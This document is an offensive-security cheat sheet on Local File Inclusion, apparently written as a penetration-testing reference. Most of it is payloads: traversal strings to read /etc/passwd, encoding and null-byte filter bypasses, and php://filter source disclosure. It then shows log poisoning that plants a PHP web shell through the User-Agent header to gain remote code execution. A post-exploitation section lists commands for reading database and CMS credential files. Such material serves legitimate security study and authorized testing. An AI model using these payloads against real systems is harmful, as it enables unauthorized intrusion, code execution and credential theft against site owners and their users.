# 📂 Local File Inclusion (LFI)

---

## 📖 Description

Local File Inclusion (LFI) is a vulnerability that occurs when a web application dynamically includes files based on user-controlled input, without properly validating the path. An attacker can manipulate that input to **force the server to read and return arbitrary files** from the filesystem — including sensitive configuration files, credentials, or system files.

In its basic form, LFI allows reading files the attacker shouldn't have access to. However, in certain conditions it can be escalated to **Remote Code Execution (RCE)** through techniques like Log Poisoning, which involves injecting PHP code into a server log file and then including it via LFI.

---

## 🔎 Detection

### Where to look

LFI vulnerabilities typically hide in parameters that load dynamic content:

- **GET parameters** → `?page=`, `?file=`, `?include=`, `?path=`, `?template=`, `?view=`
- **Form fields** → any field that loads content dynamically based on user input

---

## 💥 Exploitation

### 1. Direct absolute path

The simplest case — no traversal needed if the application includes paths as-is:

```
?page=/etc/passwd
```

### 2. Path traversal

Navigate up the directory tree with `../` sequences until reaching the filesystem root:

```
?page=../../../etc/passwd
?page=../../../../etc/passwd
?page=../../../../../etc/passwd
?page=../../../../../../etc/passwd
```

### 3. Path validation bypass

Some applications only validate that the path starts with a specific directory. Break out of it using traversal after the required prefix:

```
?filename=/var/www/images/../../../etc/passwd
```

### 4. URL encoding & double encoding

When the application decodes input before checking it, encoding the traversal sequences can bypass the filter:

```
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
?page=..%2f..%2f..%2fetc/passwd

?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

### 5. Null byte injection

On older PHP versions, a null byte (`%00`) terminates the string, stripping any suffix the application appends (e.g. `.php`):

```
?page=../../../../../../etc/passwd%00
?page=../../../../../../etc/passwd%00.php
```

### 6. Path truncation

Some applications append an extension to the filename. Overflowing the path length can cause the extension to be dropped:

```
?page=../../../../../../etc/passwd.................................
```

### 7. Miscellaneous variants

Alternative encodings and slash combinations worth trying if standard traversal is blocked:

```
....//....//....//etc/passwd
..\/..\/..\/etc/passwd
/....//....//etc/passwd
```

---

### 📄 Reading source code via PHP wrappers

When the goal is reading PHP source files rather than binary/text files, use the `php://filter` wrapper to get the content base64-encoded (otherwise PHP would execute the file instead of returning it):

```
?page=php://filter/read=convert.base64-encode/resource=config.php
?page=php://filter/read=convert.base64-encode/resource=../config.php
```

Decode the output locally:

```bash
echo "BASE64_OUTPUT" | base64 -d
```

---

### ☠️ Log Poisoning → RCE

If LFI can include server log files, it's possible to escalate to RCE by first injecting PHP code into the log, then including the log file via LFI.

**Step 1** — Poison the `User-Agent` header with a PHP payload (intercept with Burp):

```
User-Agent: <?php system($_GET['cmd']); ?>
```

**Step 2** — Include the log file and pass the command:

```bash
# Via GET parameter
GET /index.php?language=/var/log/apache2/access.log&cmd=id HTTP/1.1

# Via POST parameter (file in body, cmd in URL)
POST /dashboard.php?cmd=id HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

file=%2Fvar%2Flog%2Fapache2%2Faccess.log
```

#### Common log paths

```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/sshd.log
```

---

## 🔪 Post-Exploitation

Once code execution is achieved (via Log Poisoning or any other escalation), the first priority is reading sensitive files to gather credentials and map the environment.

### Always read first

```bash
# Database credentials
?cmd=cat+/var/www/html/config.php
?cmd=cat+/var/www/html/configuration.php
?cmd=cat+/var/www/html/db.php
?cmd=cat+/var/www/html/database.php

# System users
?cmd=cat+/etc/passwd

# Webroot structure
?cmd=ls+-la+/var/www/html

# Subdirectories
?cmd=ls+-la+/var/www/html/includes
?cmd=ls+-la+/var/www/html/admin
```

### CMS-specific config files

```bash
# WordPress
?cmd=cat+/var/www/html/wp-config.php

# Joomla
?cmd=cat+/var/www/html/configuration.php
```
